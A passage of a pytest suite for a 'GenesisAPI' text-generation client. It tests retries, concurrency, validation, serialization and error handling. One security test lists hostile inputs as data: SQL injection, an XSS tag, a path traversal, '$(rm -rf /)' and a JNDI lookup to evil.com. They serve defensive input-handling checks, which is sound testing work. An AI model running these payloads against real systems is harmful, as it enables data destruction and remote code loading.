        Verify that the configuration attributes of a GenesisAPI instance remain unchanged and immutable after instantiation.
        """
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        original_api_key = api.api_key
        original_base_url = api.base_url
        original_timeout = api.timeout
        
        # Attempting to modify should not change the instance
        try:
            api.api_key = "new_key"
        except AttributeError:
            pass  # Expected if property is read-only
        
        # Verify values haven't changed
        assert api.api_key == original_api_key
        assert api.base_url == original_base_url
        assert api.timeout == original_timeout

    @pytest.mark.asyncio
    async def test_api_resource_cleanup_on_context_exit(self):
        """
        Verifies that resources are properly cleaned up when the GenesisAPI is used as an async context manager.
        """
        cleanup_called = False
        
        class MockSession:
            def __init__(self):
                """
                Initialize the instance and set the closed state to False.
                """
                self.closed = False
                
            async def close(self):
                """
                Closes the API client and marks it as closed, triggering any necessary cleanup actions.
                """
                nonlocal cleanup_called
                cleanup_called = True
                self.closed = True
                
            async def __aenter__(self):
                """
                Enter the asynchronous context manager for the GenesisAPI instance.
                
                Returns:
                    GenesisAPI: The current instance for use within an async context.
                """
                return self
                
            async def __aexit__(self, exc_type, exc_val, exc_tb):
                """
                Performs asynchronous cleanup when exiting the async context manager by closing the API client's resources.
                """
                await self.close()
        
        with patch('aiohttp.ClientSession', MockSession):
            async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
                pass  # Just enter and exit the context
            
            # Verify cleanup was called
            assert cleanup_called

    def test_multiple_api_instances_independence(self):
        """
        Verify that multiple GenesisAPI instances maintain independent configuration and state, ensuring changes to one instance do not affect others.
        """
        api1 = GenesisAPI(api_key="key1", base_url="https://api1.example.com")
        api2 = GenesisAPI(api_key="key2", base_url="https://api2.example.com")
        
        assert api1.api_key != api2.api_key
        assert api1.base_url != api2.base_url
        
        # Test that modifying one doesn't affect the other
        api1_original_timeout = api1.timeout
        api2_original_timeout = api2.timeout
        
        # Create new instance with different timeout
        api3 = GenesisAPI(api_key="key3", base_url="https://api3.example.com", timeout=120)
        
        assert api1.timeout == api1_original_timeout
        assert api2.timeout == api2_original_timeout
        assert api3.timeout == 120

    @pytest.mark.asyncio
    async def test_api_state_during_concurrent_operations(self):
        """
        Verifies that the GenesisAPI instance maintains consistent internal state when handling multiple concurrent text generation requests.
        
        This test launches several concurrent `generate_text` calls and asserts that all responses are correct and that the API instance's configuration remains unchanged after concurrent operations.
        """
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "concurrent_state_id",
            "text": "Concurrent state response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Start multiple concurrent operations
            tasks = [
                api.generate_text(f"Concurrent prompt {i}")
                for i in range(10)
            ]
            
            results = await asyncio.gather(*tasks)
            
            # Verify all requests completed successfully
            assert len(results) == 10
            for result in results:
                assert result.text == "Concurrent state response"
            
            # Verify API state is still consistent
            assert api.api_key == self.api_key
            assert api.base_url == self.base_url


# Additional fixtures for the new comprehensive tests
@pytest.fixture
def comprehensive_test_data():
    """
    Provides a pytest fixture containing diverse test data, including Unicode strings, special characters, large numerical values, and edge case timestamps for use in comprehensive scenario testing.
    """
    return {
        "unicode_texts": [
            "Hello 世界",
            "Café naïve résumé",
            "Москва",
            "العربية",
            "🌍🚀💡😀",
            "∑∞≤≥∂"
        ],
        "special_characters": [
            "\n\t\r",
            "\\\"'/",
            "<>&",
            "{}[]",
            "$()",
            "@#%"
        ],
        "large_numbers": [
            999999999,
            1234567890123,
            float('inf'),
            -float('inf')
        ],
        "edge_case_timestamps": [
            0,
            1234567890,
            2147483647,
            253402300799
        ]
    }


@pytest.fixture
def mock_network_conditions():
    """
    Provides simulated network condition parameters for testing, including response delays, timeout thresholds, retry delays, and error rates.
    
    Returns:
        dict: A dictionary containing keys for 'slow_response', 'timeout_threshold', 'retry_delays', and 'error_rates' to configure network simulation in tests.
    """
    return {
        "slow_response": 5.0,
        "timeout_threshold": 30.0,
        "retry_delays": [1, 2, 4, 8, 16],
        "error_rates": [0.1, 0.2, 0.5, 0.8]
    }


# Integration tests with external dependencies
class TestGenesisAPIExternalIntegration:
    """Integration tests with external dependencies."""
    
    @pytest.mark.asyncio
    async def test_integration_with_logging_system(self):
        """
        Tests that the GenesisAPI integrates correctly with the Python logging system by capturing and verifying log messages during an API call.
        """
        import logging
        
        # Configure a test logger
        test_logger = logging.getLogger("genesis_api_test")
        test_logger.setLevel(logging.DEBUG)
        
        # Create a handler to capture log messages
        log_messages = []
        
        class TestHandler(logging.Handler):
            def emit(self, record):
                """
                Appends the log message from the given record to the log_messages list.
                """
                log_messages.append(record.getMessage())
        
        handler = TestHandler()
        test_logger.addHandler(handler)
        
        api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "logging_test_id",
            "text": "Logging test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that logging integration works
            with patch('logging.getLogger', return_value=test_logger):
                result = await api.generate_text("Test logging integration")
                assert result.text == "Logging test response"
        
        # Clean up
        test_logger.removeHandler(handler)

    @pytest.mark.asyncio
    async def test_integration_with_asyncio_event_loop(self):
        """
        Tests that the GenesisAPI client integrates correctly with the asyncio event loop, including compatibility with asyncio.wait_for and custom event loop configurations.
        """
        api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "event_loop_test_id",
            "text": "Event loop test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that the API works with different event loop configurations
            result = await api.generate_text("Test event loop integration")
            assert result.text == "Event loop test response"
            
            # Test with asyncio.wait_for
            result = await asyncio.wait_for(
                api.generate_text("Test with timeout"),
                timeout=10.0
            )
            assert result.text == "Event loop test response"

    def test_thread_safety_considerations(self):
        """
        Verifies that multiple threads can safely create their own event loops and use separate `GenesisAPI` instances concurrently, ensuring thread safety and correct response handling.
        """
        import threading
        import queue
        
        api = GenesisAPI(api_key="thread_test_key", base_url="https://api.genesis.example.com")
        results_queue = queue.Queue()
        
        def worker():
            # Each thread should be able to create its own event loop
            """
            Runs a worker function in a separate thread to execute an asynchronous GenesisAPI text generation call using a dedicated event loop.
            
            The function creates a new asyncio event loop for the thread, mocks the API response, and puts the result into a shared queue for later retrieval.
            """
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                mock_response = {
                    "id": "thread_test_id",
                    "text": f"Thread {threading.current_thread().name} response",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                }
                
                with patch('aiohttp.ClientSession.post') as mock_post:
                    mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                    mock_post.return_value.__aenter__.return_value.status = 200
                    
                    result = loop.run_until_complete(
                        api.generate_text(f"Thread {threading.current_thread().name} test")
                    )
                    results_queue.put(result)
            finally:
                loop.close()
        
        # Start multiple threads
        threads = []
        for i in range(3):
            thread = threading.Thread(target=worker, name=f"TestThread-{i}")
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Verify all threads completed successfully
        assert results_queue.qsize() == 3
        while not results_queue.empty():
            result = results_queue.get()
            assert "Thread TestThread-" in result.text
            assert "response" in result.text



class TestGenesisAPIAdvancedErrorScenarios:
    """Advanced error handling and recovery scenarios."""
    
    def setup_method(self):
        """Set up test fixtures for advanced error scenarios."""
        self.api_key = "advanced_error_test_key"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_partial_response_corruption_recovery(self):
        """
        Test that the API client can detect and handle partially corrupted responses.
        
        Simulates scenarios where network issues cause incomplete or corrupted JSON responses,
        verifying that appropriate errors are raised and recovery mechanisms work.
        """
        corrupted_responses = [
            '{"id": "test", "text": "incomplete',  # Incomplete JSON
            '{"id": "test", "text": null, "model": "genesis-v1"}',  # Null required field
            '{"id": "", "text": "test", "model": ""}',  # Empty required fields
            '{"id": "test", "text": "test", "model": "genesis-v1", "usage": {"prompt_tokens":',  # Truncated
        ]
        
        for corrupted_json in corrupted_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.status = 200
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                    side_effect=json.JSONDecodeError("Invalid JSON", corrupted_json, 0)
                )
                
                with pytest.raises(GenesisAPIError):
                    await self.genesis_api.generate_text("Test corrupted response")

    @pytest.mark.asyncio
    async def test_connection_reset_during_request(self):
        """
        Test handling of connection resets during active requests.
        
        Verifies that connection reset errors are properly caught and converted to
        appropriate GenesisAPIError exceptions.
        """
        import aiohttp
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate connection reset
            mock_post.side_effect = aiohttp.ClientConnectionError("Connection reset by peer")
            
            with pytest.raises(GenesisAPIError) as exc_info:
                await self.genesis_api.generate_text("Test connection reset")
            
            assert "connection" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_dns_resolution_failure(self):
        """
        Test handling of DNS resolution failures for the API endpoint.
        
        Simulates DNS lookup failures and verifies appropriate error handling.
        """
        import aiohttp
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate DNS resolution failure
            mock_post.side_effect = aiohttp.ClientConnectorError(
                connection_key=None, 
                os_error=OSError("Name or service not known")
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text("Test DNS failure")

    @pytest.mark.asyncio
    async def test_response_size_limit_exceeded(self):
        """
        Test handling when API response exceeds reasonable size limits.
        
        Verifies that extremely large responses are handled gracefully without
        causing memory issues or crashes.
        """
        # Simulate extremely large response (10MB)
        huge_text = "x" * (10 * 1024 * 1024)
        mock_response = {
            "id": "huge_response_test",
            "text": huge_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 10000000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle large responses without issues
            result = await self.genesis_api.generate_text("Generate huge response")
            assert len(result.text) == 10 * 1024 * 1024
            assert result.usage["completion_tokens"] == 10000000

    @pytest.mark.asyncio
    async def test_rapid_sequential_requests_rate_limiting(self):
        """
        Test that rapid sequential requests handle rate limiting appropriately.
        
        Simulates making many requests in quick succession and verifies that
        rate limit responses are handled correctly.
        """
        rate_limit_count = 0
        success_count = 0
        
        async def mock_response_handler(*args, **kwargs):
            nonlocal rate_limit_count, success_count
            
            # First few requests succeed, then rate limited
            if success_count < 3:
                success_count += 1
                mock_resp = AsyncMock()
                mock_resp.status = 200
                mock_resp.json = AsyncMock(return_value={
                    "id": f"success_{success_count}",
                    "text": f"Success response {success_count}",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                })
                return mock_resp
            else:
                rate_limit_count += 1
                mock_resp = AsyncMock()
                mock_resp.status = 429
                mock_resp.json = AsyncMock(return_value={
                    "error": "Rate limit exceeded",
                    "retry_after": 1
                })
                return mock_resp
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.side_effect = mock_response_handler
            
            # Make rapid requests
            results = []
            for i in range(5):
                try:
                    result = await self.genesis_api.generate_text(f"Rapid request {i}")
                    results.append(result)
                except GenesisAPIRateLimitError:
                    # Expected for later requests
                    pass
            
            # Should have some successes and some rate limit errors
            assert len(results) == 3  # First 3 should succeed
            assert rate_limit_count == 2  # Last 2 should be rate limited


class TestGenesisAPIAdvancedValidation:
    """Advanced input validation and sanitization tests."""
    
    def test_prompt_length_boundary_validation(self):
        """
        Test validation of prompts at various length boundaries.
        
        Verifies that prompts of different lengths are handled appropriately,
        including edge cases around common token limits.
        """
        boundary_lengths = [
            1,      # Minimum length
            100,    # Short prompt
            1000,   # Medium prompt  
            4000,   # Approaching common limits
            8000,   # Large prompt
            16000,  # Very large prompt
            32000,  # Extremely large prompt
        ]
        
        for length in boundary_lengths:
            prompt = "A" * length
            
            # Should not raise validation errors for reasonable lengths
            if length <= 32000:
                formatted = format_genesis_prompt(prompt)
                assert formatted["prompt"] == prompt
                assert len(formatted["prompt"]) == length
            
    def test_temperature_precision_edge_cases(self):
        """
        Test temperature validation with high precision floating point values.
        
        Verifies that floating point precision is maintained and edge cases
        around 0.0 and 1.0 are handled correctly.
        """
        precision_temperatures = [
            0.0,
            0.000001,
            0.1,
            0.123456789,
            0.5,
            0.999999999,
            1.0
        ]
        
        for temp in precision_temperatures:
            formatted = format_genesis_prompt("Test", temperature=temp)
            assert abs(formatted["temperature"] - temp) < 1e-10

    def test_max_tokens_edge_values(self):
        """
        Test max_tokens validation with edge case values.
        
        Verifies that boundary values for max_tokens are handled correctly,
        including minimum and maximum allowed values.
        """
        edge_values = [
            1,      # Minimum
            2,      # Just above minimum
            100,    # Common small value
            1000,   # Common medium value
            4096,   # Common maximum
            8192,   # Large value
        ]
        
        for max_tokens in edge_values:
            formatted = format_genesis_prompt("Test", max_tokens=max_tokens)
            assert formatted["max_tokens"] == max_tokens

    def test_model_name_validation_comprehensive(self):
        """
        Test validation of various model name formats.
        
        Verifies that different model naming conventions are accepted
        and invalid model names are rejected appropriately.
        """
        valid_models = [
            "genesis-v1",
            "genesis-v2",
            "genesis-large",
            "genesis-turbo",
            "custom-model-1.0",
            "model_with_underscores",
            "model-with-dashes",
        ]
        
        for model in valid_models:
            formatted = format_genesis_prompt("Test", model=model)
            assert formatted["model"] == model

    def test_unicode_normalization_in_prompts(self):
        """
        Test that Unicode text in prompts is handled consistently.
        
        Verifies that different Unicode normalization forms are preserved
        and handled correctly in API requests.
        """
        import unicodedata
        
        # Test different Unicode normalization forms
        unicode_text = "café naïve résumé"
        
        # Test different normalization forms
        nfc_text = unicodedata.normalize('NFC', unicode_text)
        nfd_text = unicodedata.normalize('NFD', unicode_text)
        nfkc_text = unicodedata.normalize('NFKC', unicode_text)
        nfkd_text = unicodedata.normalize('NFKD', unicode_text)
        
        for normalized_text in [nfc_text, nfd_text, nfkc_text, nfkd_text]:
            formatted = format_genesis_prompt(normalized_text)
            assert formatted["prompt"] == normalized_text


class TestGenesisAPIAdvancedRetryLogic:
    """Advanced retry mechanism and backoff strategy tests."""
    
    def setup_method(self):
        """Set up test fixtures for retry logic tests."""
        self.api_key = "retry_test_key"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_exponential_backoff_timing_verification(self):
        """
        Test that exponential backoff delays follow the expected pattern.
        
        Verifies that retry delays increase exponentially and that the
        backoff algorithm implements proper jitter to avoid thundering herd.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("Error 1"),
            GenesisAPIServerError("Error 2"), 
            GenesisAPIServerError("Error 3"),
            "Success"
        ]
        
        sleep_delays = []
        
        async def mock_sleep(delay):
            sleep_delays.append(delay)
        
        with patch('asyncio.sleep', side_effect=mock_sleep):
            result = await retry_with_exponential_backoff(mock_func, max_retries=4)
            assert result == "Success"
            assert len(sleep_delays) == 3
            
            # Verify exponential progression (allowing for jitter)
            assert sleep_delays[0] <= sleep_delays[1] <= sleep_delays[2] * 1.5

    @pytest.mark.asyncio
    async def test_retry_with_different_error_types(self):
        """
        Test retry behavior with different types of recoverable and non-recoverable errors.
        
        Verifies that only appropriate error types trigger retries while others
        fail immediately.
        """
        # Test that server errors are retried
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("Server error"),
            "Success"
        ]
        
        with patch('asyncio.sleep'):
            result = await retry_with_exponential_backoff(mock_func, max_retries=2)
            assert result == "Success"
            assert mock_func.call_count == 2

        # Test that auth errors are not retried
        mock_func.reset_mock()
        mock_func.side_effect = GenesisAPIAuthenticationError("Auth error")
        
        with pytest.raises(GenesisAPIAuthenticationError):
            await retry_with_exponential_backoff(mock_func, max_retries=2)
        assert mock_func.call_count == 1  # Should not retry

    @pytest.mark.asyncio
    async def test_retry_exhaustion_preserves_last_error(self):
        """
        Test that when all retries are exhausted, the last error is preserved.
        
        Verifies that error information from the final retry attempt is
        preserved and returned to the caller.
        """
        original_error = GenesisAPIServerError("Final error with details")
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("First error"),
            GenesisAPIServerError("Second error"),
            original_error
        ]
        
        with patch('asyncio.sleep'):
            with pytest.raises(GenesisAPIServerError) as exc_info:
                await retry_with_exponential_backoff(mock_func, max_retries=3)
            
            # Should preserve the last error
            assert str(exc_info.value) == "Final error with details"

    @pytest.mark.asyncio
    async def test_retry_with_intermittent_success(self):
        """
        Test retry behavior with intermittent failures and successes.
        
        Simulates real-world scenarios where some requests fail but eventual
        success is achieved through retries.
        """
        call_count = 0
        
        async def intermittent_func():
            nonlocal call_count
            call_count += 1
            
            # Fail on specific attempts, succeed on others
            if call_count in [1, 3]:
                raise GenesisAPIServerError(f"Intermittent error {call_count}")
            return f"Success on attempt {call_count}"
        
        with patch('asyncio.sleep'):
            result = await retry_with_exponential_backoff(intermittent_func, max_retries=5)
            assert result == "Success on attempt 2"
            assert call_count == 2


class TestGenesisAPIAdvancedConcurrency:
    """Advanced concurrency and async behavior tests."""
    
    def setup_method(self):
        """Set up test fixtures for concurrency tests."""
        self.api_key = "concurrency_test_key"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_semaphore_limited_concurrent_requests(self):
        """
        Test that concurrent requests can be limited using semaphores.
        
        Verifies that the API client can work with asyncio semaphores to
        limit the number of concurrent requests.
        """
        # Limit to 3 concurrent requests
        semaphore = asyncio.Semaphore(3)
        active_requests = 0
        max_concurrent = 0
        
        async def limited_request(prompt):
            nonlocal active_requests, max_concurrent
            
            async with semaphore:
                active_requests += 1
                max_concurrent = max(max_concurrent, active_requests)
                
                # Simulate API call
                mock_response = {
                    "id": f"semaphore_test_{prompt}",
                    "text": f"Limited response for {prompt}",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                }
                
                with patch('aiohttp.ClientSession.post') as mock_post:
                    mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                    mock_post.return_value.__aenter__.return_value.status = 200
                    
                    # Add small delay to simulate real API call
                    await asyncio.sleep(0.1)
                    result = await self.genesis_api.generate_text(prompt)
                    
                active_requests -= 1
                return result
        
        # Create 10 concurrent requests
        tasks = [limited_request(f"prompt_{i}") for i in range(10)]
        results = await asyncio.gather(*tasks)
        
        assert len(results) == 10
        assert max_concurrent <= 3  # Should never exceed semaphore limit

    @pytest.mark.asyncio
    async def test_task_cancellation_cleanup(self):
        """
        Test that cancelled tasks properly clean up resources.
        
        Verifies that when async tasks are cancelled, any allocated resources
        are properly released and no resource leaks occur.
        """
        cleanup_called = False
        
        async def cancellable_request():
            nonlocal cleanup_called
            try:
                # Simulate long-running request
                await asyncio.sleep(10)
                return "Should not reach here"
            except asyncio.CancelledError:
                cleanup_called = True
                raise
        
        with patch.object(self.genesis_api, 'generate_text', side_effect=cancellable_request):
            task = asyncio.create_task(self.genesis_api.generate_text("Test cancellation"))
            
            # Let task start
            await asyncio.sleep(0.1)
            
            # Cancel the task
            task.cancel()
            
            with pytest.raises(asyncio.CancelledError):
                await task
            
            assert cleanup_called

    @pytest.mark.asyncio
    async def test_deadlock_prevention_in_nested_calls(self):
        """
        Test that nested async calls don't cause deadlocks.
        
        Verifies that calling the API client from within async callbacks
        or nested contexts doesn't cause deadlock situations.
        """
        results = []
        
        async def nested_api_call(outer_prompt):
            # First API call
            mock_response_1 = {
                "id": "nested_1",
                "text": f"First response to {outer_prompt}",
                "model": "genesis-v1",
                "created": 1234567890,
                "usage": {"prompt_tokens": 5, "completion_tokens": 10}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response_1)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                first_result = await self.genesis_api.generate_text(outer_prompt)
                
                # Nested API call based on first result
                mock_response_2 = {
                    "id": "nested_2", 
                    "text": f"Nested response based on: {first_result.text}",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 10, "completion_tokens": 15}
                }
                
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response_2)
                
                second_result = await self.genesis_api.generate_text(f"Follow up to: {first_result.text}")
                
                return [first_result, second_result]
        
        # Run multiple nested calls concurrently
        tasks = [nested_api_call(f"prompt_{i}") for i in range(3)]
        results = await asyncio.gather(*tasks)
        
        assert len(results) == 3
        for result_pair in results:
            assert len(result_pair) == 2
            assert "First response" in result_pair[0].text
            assert "Nested response" in result_pair[1].text


class TestGenesisAPIDataIntegrityAndSerialization:
    """Advanced data integrity and serialization tests."""
    
    def test_deep_object_serialization_consistency(self):
        """
        Test that complex nested objects maintain consistency through serialization cycles.
        
        Verifies that deeply nested data structures in requests and responses
        are preserved accurately through multiple serialization/deserialization cycles.
        """
        complex_request = GenesisRequest(
            prompt="Complex serialization test",
            model="genesis-v1",
            max_tokens=200,
            temperature=0.75
        )
        
        # Multiple serialization cycles
        for _ in range(5):
            serialized = complex_request.to_dict()
            json_str = json.dumps(serialized, sort_keys=True)
            parsed = json.loads(json_str)
            complex_request = GenesisRequest.from_dict(parsed)
        
        # Verify data integrity is maintained
        assert complex_request.prompt == "Complex serialization test"
        assert complex_request.temperature == 0.75

    def test_response_data_corruption_detection(self):
        """
        Test detection of corrupted response data.
        
        Verifies that the response parser can detect various forms of data
        corruption and handle them appropriately.
        """
        corruption_scenarios = [
            # Missing required fields
            {"text": "Missing id and model"},
            
            # Type mismatches
            {"id": 123, "text": "ID should be string", "model": "genesis-v1"},
            {"id": "test", "text": 456, "model": "genesis-v1"},
            {"id": "test", "text": "test", "model": ["should", "be", "string"]},
            
            # Invalid usage data
            {"id": "test", "text": "test", "model": "genesis-v1", "usage": "not_dict"},
            {"id": "test", "text": "test", "model": "genesis-v1", "usage": {"prompt_tokens": "not_int"}},
            
            # Extreme values
            {"id": "test", "text": "test", "model": "genesis-v1", "created": -1},
            {"id": "test", "text": "test", "model": "genesis-v1", "usage": {"prompt_tokens": -100}},
        ]
        
        for corrupted_data in corruption_scenarios:
            with pytest.raises(GenesisAPIError):
                parse_genesis_response(corrupted_data)

    def test_large_numbers_precision_preservation(self):
        """
        Test that large numbers maintain precision through serialization.
        
        Verifies that very large integers and high-precision floats are
        preserved accurately in API requests and responses.
        """
        large_numbers_response = GenesisResponse(
            id="precision_test",
            text="Large numbers test",
            model="genesis-v1",
            created=9999999999999,  # Very large timestamp
            usage={
                "prompt_tokens": 999999999999999,
                "completion_tokens": 888888888888888,
                "total_tokens": 1888888888888887,
                "processing_time": 123.456789012345
            }
        )
        
        # Test serialization preserves precision
        serialized = large_numbers_response.to_dict()
        assert serialized["created"] == 9999999999999
        assert serialized["usage"]["prompt_tokens"] == 999999999999999
        assert abs(serialized["usage"]["processing_time"] - 123.456789012345) < 1e-10
        
        # Test round-trip preservation
        reconstructed = GenesisResponse.from_dict(serialized)
        assert reconstructed.created == 9999999999999
        assert reconstructed.usage["prompt_tokens"] == 999999999999999

    def test_binary_data_rejection_comprehensive(self):
        """
        Test comprehensive rejection of binary data in text fields.
        
        Verifies that various forms of binary data are properly rejected
        and don't cause security issues or data corruption.
        """
        binary_inputs = [
            b'\x00\x01\x02\x03',  # Null bytes
            b'\xff\xfe\xfd\xfc',  # High bytes
            b'\x80\x81\x82\x83',  # Invalid UTF-8
            bytes(range(256)),     # Full byte range
        ]
        
        for binary_input in binary_inputs:
            with pytest.raises((TypeError, ValueError, UnicodeDecodeError)):
                format_genesis_prompt(binary_input)
            
            with pytest.raises((TypeError, ValueError, UnicodeDecodeError)):
                GenesisRequest(prompt=binary_input, model="genesis-v1")


# Additional fixtures for the new test classes
@pytest.fixture
def advanced_error_scenarios():
    """
    Provides a comprehensive list of advanced error scenarios for testing edge cases.
    
    Returns:
        List[dict]: Error scenarios with status codes, error messages, and expected behaviors.
    """
    return [
        {"status": 408, "error": "Request timeout", "retryable": True},
        {"status": 409, "error": "Conflict", "retryable": False},
        {"status": 413, "error": "Payload too large", "retryable": False},
        {"status": 418, "error": "I'm a teapot", "retryable": False},
        {"status": 422, "error": "Unprocessable entity", "retryable": False},
        {"status": 499, "error": "Client closed request", "retryable": True},
        {"status": 502, "error": "Bad gateway", "retryable": True},
        {"status": 504, "error": "Gateway timeout", "retryable": True},
    ]


@pytest.fixture
def unicode_test_strings():
    """
    Provides various Unicode test strings for comprehensive Unicode handling tests.
    
    Returns:
        List[str]: Unicode strings covering different character sets and edge cases.
    """
    return [
        "ASCII only text",
        "Café naïve résumé", 
        "Москва (Moscow)",
        "العربية (Arabic)",
        "中文 (Chinese)",
        "日本語 (Japanese)",
        "🌍🚀💡😀🎉 (Emojis)",
        "∑∞≤≥∂∆∇ (Math symbols)",
        "\u200b\u200c\u200d (Zero-width chars)",
        "\ufeff (BOM)",
        "Combining chars: e\u0301a\u0308o\u0303",
        "RTL: \u202eHello\u202c",
    ]


@pytest.fixture  
def performance_stress_config():
    """
    Configuration parameters for performance and stress testing scenarios.
    
    Returns:
        dict: Configuration values for stress testing including batch sizes and timeouts.
    """
    return {
        "large_batch_size": 1000,
        "massive_prompt_size": 100000,
        "concurrent_limit": 100,
        "stress_duration": 30,
        "memory_limit_mb": 500,
        "cpu_time_limit": 10.0
    }


# Parameterized tests for comprehensive boundary testing
@pytest.mark.parametrize("boundary_temp", [
    0.0, 0.01, 0.1, 0.25, 0.5, 0.75, 0.9, 0.99, 1.0
])
def test_temperature_boundary_values_comprehensive(boundary_temp):
    """
    Comprehensive test of temperature boundary values across the valid range.
    
    Parameters:
        boundary_temp (float): Temperature value to test at various boundaries.
    """
    formatted = format_genesis_prompt("Boundary test", temperature=boundary_temp)
    assert abs(formatted["temperature"] - boundary_temp) < 1e-10


@pytest.mark.parametrize("token_boundary", [
    1, 2, 10, 50, 100, 500, 1000, 2048, 4096, 8192
])
def test_max_tokens_boundary_values_comprehensive(token_boundary):
    """
    Test max_tokens at various boundary values commonly used in practice.
    
    Parameters:
        token_boundary (int): Token limit value to test.
    """
    formatted = format_genesis_prompt("Token boundary test", max_tokens=token_boundary)
    assert formatted["max_tokens"] == token_boundary


@pytest.mark.parametrize("error_scenario", [
    (400, "Bad request", GenesisAPIError),
    (402, "Payment required", GenesisAPIError), 
    (406, "Not acceptable", GenesisAPIError),
    (410, "Gone", GenesisAPIError),
    (423, "Locked", GenesisAPIError),
    (426, "Upgrade required", GenesisAPIError),
    (451, "Unavailable for legal reasons", GenesisAPIError),
    (511, "Network authentication required", GenesisAPIError),
])
def test_extended_http_error_handling(error_scenario):
    """
    Test handling of extended HTTP error codes beyond the common ones.
    
    Parameters:
        error_scenario (tuple): Contains status code, error message, and expected exception type.
    """
    status_code, error_message, expected_exception = error_scenario
    
    with pytest.raises(expected_exception):
        handle_genesis_error(status_code, {"error": error_message})


class TestGenesisAPISecurityAndResilience:
    """Security-focused and resilience testing."""
    
    def test_input_sanitization_and_injection_prevention(self):
        """
        Verifies that prompt formatting does not alter potentially malicious input 
        and that API key validation correctly rejects unsafe values.
        """
        potentially_malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(rm -rf /)",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02",  # Null bytes and control characters
        ]
        
        for malicious_input in potentially_malicious_inputs:
            # Should not raise exceptions during formatting
            formatted = format_genesis_prompt(malicious_input)
            assert formatted["prompt"] == malicious_input  # Should be preserved as-is
            
            # API key validation should reject malicious content
            assert validate_api_key(malicious_input) == False

    def test_memory_exhaustion_protection(self):
        """
        Test that the API client protects against memory exhaustion attacks.
        
        Verifies that extremely large inputs are handled gracefully without
        causing out-of-memory conditions.
        """
        # Test with very large prompt (1MB)
        large_prompt = "A" * (1024 * 1024)
        
        # Should handle large prompts without memory issues
        formatted = format_genesis_prompt(large_prompt)
        assert len(formatted["prompt"]) == 1024 * 1024

    @pytest.mark.asyncio
    async def test_timeout_protection_mechanisms(self):
        """
        Test that appropriate timeouts are enforced to prevent hanging requests.
        
        Verifies that requests don't hang indefinitely when the server is
        unresponsive or extremely slow.
        """
        genesis_api = GenesisAPI(api_key="timeout_test", base_url="https://api.genesis.example.com", timeout=1)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate very slow response
            async def slow_response(*args, **kwargs):
                await asyncio.sleep(10)  # Much longer than timeout
                return AsyncMock()
            
            mock_post.side_effect = slow_response
            
            with pytest.raises(GenesisAPITimeoutError):
                await genesis_api.generate_text("Timeout test")


if __name__ == "__main__":
    # Run specific test classes for the new comprehensive tests
    pytest.main([
